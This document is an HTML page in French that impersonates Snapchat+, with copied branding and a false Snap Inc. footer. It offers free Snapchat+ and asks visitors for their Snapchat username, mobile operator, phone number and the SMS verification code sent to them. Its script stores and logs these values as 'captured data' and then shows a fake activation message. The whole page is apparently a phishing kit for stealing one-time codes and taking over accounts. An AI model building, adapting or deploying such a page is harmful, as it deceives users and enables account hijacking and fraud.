<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tech Snapchat+</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .header { background:#111; padding:8px; text-align:center; border-bottom:1px solid #222; }
        .logo { width:55px; height:55px; margin:5px auto; display:block; }
        .title { font-size:20px; font-weight:700; margin:3px 0 10px; }
        .container { max-width:340px; margin:10px auto; padding:0 10px; }
        .section { background:#1c1c1e; padding:12px; border-radius:12px; margin-bottom:10px; }
        h3 { margin:0 0 6px 0; font-size:14px; }
        input, select { width:100%; padding:11px; margin:5px 0; background:#2c2c2e; border:none; border-radius:8px; color:#fff; font-size:15px; box-sizing:border-box; }
        .btn { width:100%; padding:14px; background:#fffc00; color:#000; font-size:16px; font-weight:700; border:none; border-radius:10px; margin-top:8px; }
        .code-container { display:flex; gap:8px; justify-content:center; margin:12px 0; }
        .code-input { width:46px; height:46px; text-align:center; font-size:20px; font-weight:700; border-radius:8px; background:#2c2c2e; border:none; color:#fff; }
        .success { text-align:center; padding:25px 15px; }
        .footer { text-align:center; padding:15px 10px; font-size:11px; color:#666; margin-top:20px; }
        .footer a { color:#666; text-decoration:none; margin:0 5px; }
    </style>
</head>
<body>
    <div class="header">
        <!-- Ton logo (IMG_9620.png) -->
        <img src="IMG_9620.png" class="logo">
        <div class="title">Snapchat+</div>
    </div>

    <div class="container" id="form1">
        <div class="section">
            <h3>Ton Snapchat</h3>
            <input type="text" id="snap" placeholder="@tonpseudo" required>
        </div>

        <div class="section">
            <h3>Durée Snapchat+</h3>
            <select id="duree">
                <option value="3 mois">3 mois</option>
                <option value="6 mois">6 mois</option>
                <option value="12 mois">12 mois</option>
            </select>
        </div>

        <div class="section">
            <h3>Opérateur &amp; Numéro</h3>
            <select id="operateur">
                <option value="Bouygues">Bouygues</option>
                <option value="Orange">Orange</option>
                <option value="SFR">SFR</option>
            </select>
            <input type="tel" id="numero" placeholder="06 12 34 56 78" required>
        </div>

        <button class="btn" onclick="goToCode()">Suivant</button>
    </div>

    <div class="container" id="form2" style="display:none;">
        <div class="section">
            <h3>Code de vérification envoyé</h3>
            <p style="font-size:13px; margin:6px 0;">Un code a été envoyé par SMS au <span id="numDisplay"></span></p>
            
            <div class="code-container">
                <input type="text" class="code-input" id="c1" maxlength="1" inputmode="numeric">
                <input type="text" class="code-input" id="c2" maxlength="1" inputmode="numeric">
                <input type="text" class="code-input" id="c3" maxlength="1" inputmode="numeric">
                <input type="text" class="code-input" id="c4" maxlength="1" inputmode="numeric">
            </div>

            <button class="btn" onclick="verifyCode()">Vérifier le code</button>
        </div>
    </div>

    <div class="container" id="success" style="display:none;">
        <div class="success">
            <div style="font-size:48px; margin-bottom:10px;">✅</div>
            <h2 style="color:#fffc00; font-size:22px; margin:0 0 15px;">Snapchat+ activé !</h2>
            <p style="font-size:15px; line-height:1.4;">
                Ton Snapchat <strong id="snapFinal"></strong> a bien reçu <strong>Snapchat+</strong><br>
                pour <strong id="dureeFinal"></strong>.
            </p>
            <p style="font-size:14px; color:#aaa; margin-top:15px;">
                Tu le recevras en moins de <strong>5 minutes</strong>.
            </p>
        </div>
    </div>

    <div class="footer">
        © 2026 Snap Inc.<br>
        <a href="#">Confidentialité</a> • <a href="#">Conditions d’utilisation</a> • <a href="#">Aide</a>
    </div>

    <script>
        let userData = {};

        function setupCodeInputs() {
            const inputs = document.querySelectorAll('.code-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === "Backspace" && input.value === "" && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        function goToCode() {
            const snap = document.getElementById("snap").value;
            const duree = document.getElementById("duree").value;
            const operateur = document.getElementById("operateur").value;
            const numero = document.getElementById("numero").value;

            if (!snap || !numero) {
                alert("Remplis tous les champs");
                return;
            }

            userData = { snap, duree, operateur, numero };
            console.log("%c[SNAP+] Données capturées :", "color:lime", userData);

            document.getElementById("form1").style.display = "none";
            document.getElementById("form2").style.display = "block";
            document.getElementById("numDisplay").innerText = numero;
            setupCodeInputs();
        }

        function verifyCode() {
            const code = 
                document.getElementById("c1").value +
                document.getElementById("c2").value +
                document.getElementById("c3").value +
                document.getElementById("c4").value;

            if (code.length < 4) {
                alert("Code invalide");
                return;
            }

            userData.code = code;
            console.log("%c[SNAP+] Code entré :", "color:lime", code);

            document.getElementById("form2").style.display = "none";
            document.getElementById("success").style.display = "block";
            document.getElementById("snapFinal").innerText = userData.snap;
            document.getElementById("dureeFinal").innerText = userData.duree;
        }
    </script>
</body>
</html>
